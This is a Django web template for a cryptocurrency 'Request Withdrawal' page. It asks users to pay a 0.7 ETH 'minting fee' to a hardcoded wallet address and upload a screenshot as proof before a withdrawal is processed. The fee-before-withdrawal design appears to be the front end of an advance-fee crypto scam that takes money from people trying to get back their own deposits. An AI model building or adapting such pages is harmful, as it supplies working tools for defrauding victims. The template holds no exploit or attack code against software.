{% extends "dashbase.html" %}

{% block content %}
    <section>
            <form action="" method="post" enctype='multipart/form-data' class='w-1/3 max-md:w-11/12 p-5 bg-white mx-auto mt-5 rounded-md flex flex-col gap-3'>
    {% csrf_token %}
        <h1 class='text-xl font-bold text-center bg-gradient-to-r from-pink-300 via-purple-300 to-indigo-400 inline-block text-transparent  bg-clip-text'>REQUEST WITHDRAWAL</h1>

        <fieldset class='flex gap-2 flex-col font-medium'>
        <label for="file" class="text-blue-500">Amount (ETH)</label>
        <input type="number" step='0.001' placeholder='0.00' name="amount" id="file" class='rounded-md' required>
        </fieldset>
        <div class='h-full bg-blue-50 py-1 rounded-md flex flex-col gap-1 items-center'>
            <p class='font-medium max-sm:text-[.7rem]'>Pay 0.7ETH minting fee to this address</p>
            <img src="{%static 'images/w-fee.png'%}" class='h-[100px] object-contain w-full' alt="">
            <p class='bg-white w-11/12 p-2 rounded-md font-medium text-[.7rem] max-sm:text-[.55rem] flex items-center gap-1'><input type="text" name="eth" value="0x2588672098e60AD7c35D1A8CE7896bcb6F0f39Ea" placeholder="0x2588672098e60AD7c35D1A8CE7896bcb6F0f39Ea" id="eth" class="text-[.7rem] max-sm:text-[.55rem] border-0 bg-white  read-only:text-[.7rem] read-only:w-full " readonly> <span data-clipboard-target='#eth' class='bg-black btn rounded-md text-white copy cursor-pointer p-2 max-sm:p-1' >Copy</span></p>
        </div>
        <fieldset class='flex gap-2 flex-col font-medium'>
        <label for="file" class="text-blue-500">Upload Payment Proof (JPG, PNG)</label>
        <input type="file" name="proof" id="file" class='rounded-md' accept='image/*' required>
        </fieldset>
        <button class='bg-blue-500 text-white py-3 rounded-md'>Withdraw</button>
    </form>
    </section>
{% endblock content %}
